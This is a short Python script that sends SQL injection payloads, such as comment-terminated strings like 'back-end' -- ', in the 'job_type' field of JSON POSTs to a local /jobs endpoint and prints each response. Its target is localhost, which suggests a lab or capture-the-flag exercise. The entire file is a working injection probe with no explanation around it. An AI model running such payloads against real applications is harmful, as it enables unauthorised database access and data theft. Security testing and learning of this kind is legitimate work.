import json, urllib.request
url = 'http://localhost:80/jobs'
for payload in ["back-end' -- ", "back-end'-- ", "back-end'/*", "back-end') -- ", "back-end" ]:
    body = json.dumps({"job_type": payload}).encode()
    req = urllib.request.Request(url, data=body, headers={'Content-Type':'application/json'})
    try:
        with urllib.request.urlopen(req) as resp:
            print(payload, '->', resp.status, resp.read().decode())
    except urllib.error.HTTPError as e:
        print(payload, '-> HTTP', e.code, e.read().decode())
    except Exception as e:
        print(payload, '-> ERR', e)

